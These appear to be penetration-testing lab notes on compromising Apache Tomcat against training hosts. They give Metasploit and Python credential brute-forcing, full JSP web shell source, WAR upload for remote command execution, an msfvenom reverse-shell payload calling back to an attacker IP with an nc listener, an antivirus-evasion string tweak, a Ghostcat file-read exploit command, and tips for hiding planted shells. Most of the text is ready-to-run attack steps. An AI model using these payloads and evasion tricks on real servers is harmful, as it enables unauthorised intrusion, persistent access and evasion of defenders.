## Attacking Apache Tomcat
### Objective

Gain internal access via an exposed Tomcat service through:

- Credential brute-forcing    
- WAR deployment
- Web shells
- LFI exploitation (Ghostcat/CVE-2020-1938)
### 1. Tomcat Manager – Login Brute Force
#### Method: Using Metasploit

Module: `auxiliary/scanner/http/tomcat_mgr_login`

Configuration:

```bash
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
set STOP_ON_SUCCESS true
```

Wordlists Used:

- Usernames: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`    
- Passwords: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
Run:

```bash
run
```

Result:

- Successful credentials found: `tomcat:admin`    
#### Metasploit Proxy Debugging

To debug through Burp:

```bash
set PROXIES HTTP:127.0.0.1:8080
run
```

Check authorization headers:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
# Output: admin:vagrant
```
### 2. Brute Force with Python
#### Script: `mgr_brute.py`

```bash
python3 mgr_brute.py \
-U http://web01.inlanefreight.local:8180/ \
-P /manager \
-u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
-p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

Result:

- Hit: `Username : b'tomcat'`, `Password : b'admin'`    
### 3. Tomcat Manager – WAR Upload

#### Step-by-Step:

1. JSP Web Shell (cmd.jsp):
   
```jsp
<%@ page import="java.util.*,java.io.*"%>
    <FORM METHOD="GET" NAME="myform">
      <INPUT TYPE="text" NAME="cmd">
      <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) { out.println(line); }
    }
    %>
</pre>
```

2. Create WAR:
   
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

3. Upload WAR:
    - Go to `/manager/html`
    - Upload `backup.war`

4. Access Web Shell:

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

5. Cleanup:
    - Click Undeploy in manager    
    - Confirm WAR location: `/opt/tomcat/apache-tomcat-10.0.10/webapps`
### 4. Reverse Shell via Metasploit WAR Payload

1. Generate WAR with msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
 
2. Deploy WAR in `/manager/html`
 
3. Start Listener:

```bash
nc -lnvp 4443
```
 
4. Trigger Shell:
   
    - Visit `/backup`
### 5. Web Shell Evasion Tactics

- Modify strings to evade AV:
   
```jsp
FileOutputStream(f);stream.write(m);o="Uploaded:
# becomes:
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```
 
- Detection dropped from 2/58 to 0/58 on VirusTotal.    
### 6. CVE-2020-1938: Ghostcat (Tomcat AJP LFI)

- Affects: Tomcat < 9.0.31, < 8.5.51, < 7.0.100    
- Exploits misconfigured AJP port (default: 8009)

Scan:

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

PoC:

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

Result:

- Can read files within `/webapps`, e.g. `web.xml`
### 7. Key Considerations

- WAR uploads offer full RCE    
- Tomcat often runs as SYSTEM/root → high-value foothold
- Always clean up:
    - Remove WARs
    - Undeploy apps        
- Protect shells:
    - Random filenames        
    - Restrict IPs
    - Add authentication        
# Tags
> #Exploitation #Application-Exploitation #Tomcat 